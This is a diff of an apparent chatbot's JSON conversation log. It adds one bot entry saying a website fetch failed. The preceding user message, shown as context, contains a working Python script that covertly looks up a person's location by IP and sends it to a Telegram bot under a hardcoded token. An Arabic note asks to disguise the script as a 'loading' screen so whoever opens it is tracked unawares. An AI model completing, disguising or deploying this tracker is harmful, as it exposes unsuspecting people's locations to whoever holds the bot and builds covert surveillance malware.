@@ -430,5 +430,14 @@
       "import requests\nimport json\nimport time\nimport geocoder\n\n# Telegram Bot API Credentials\nBOT_TOKEN = \"8845469913:AAGpd9MGUAKg12U3MDv0H0AvA5PU0FS-6y4\"\nCHAT_ID = \"974919447\"\n\n# Get Location (Direct IP Fetch)\ndef get_location():\n    try:\n        g = geocoder.ip('me')\n        location_data = {\n            \"ip\": g.ip,\n            \"city\": g.city,\n            \"country\": g.country,\n            \"latitude\": g.latlng[0] if g.latlng else \"Unknown\",\n            \"longitude\": g.latlng[1] if g.latlng else \"Unknown\",\n            \"timestamp\": str(time.time())\n        }\n        return location_data\n    except Exception as e:\n        return {\"error\": str(e)}\n\n# Send Location to Telegram\ndef send_location():\n    location = get_location()\n    url = f\"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage\"\n    \n    text_message = (\n        f\"📍 *Location Tracked*\\n\\n\"\n        f\"🔍 *Target IP:* {location.get('ip', 'Unknown')}\\n\"\n        f\"📊 *City:* {location.get('city', 'Unknown')}\\n\"\n        f\"🌍 *Country:* {location.get('country', 'Unknown')}\\n\"\n        f\"📍 *Coordinates:* {location.get('latitude', 'Unknown')}, {location.get('longitude', 'Unknown')}\\n\"\n        f\"🕒 *Timestamp:* {location.get('timestamp', 'Unknown')}\"\n    )\n    \n    payload = {\n        \"chat_id\": CHAT_ID,\n        \"text\": text_message,\n        \"parse_mode\": \"Markdown\"\n    }\n    headers = {\"Content-Type\": \"application/json\"}\n    response = requests.post(url, data=json.dumps(payload), headers=headers)\n    return response.json()\n\n# Execute\nif name == \"main\":\n    print(\"جاري جلب البيانات وإرسالها إلى التليجرام...\")\n    result = send_location()  \n    print(\"النتيجة من سيرفر تليجرام:\")\n    print(result)\nكون من شخص يفتح الاده تطلعه جار التحميل"
     ],
     "timestamp": "2026-06-16 03:54:37"
+  },
+  {
+    "id": "1808e8c04aa1493d98e59663b4ce3e41",
+    "role": "bluebot",
+    "chat_id": "8992903348",
+    "parts": [
+      "URL_CONTEXT :[SYSTEM]: فشل سحب محتويات الموقع."
+    ],
+    "timestamp": "2026-06-16 03:55:09"
   }
 ]
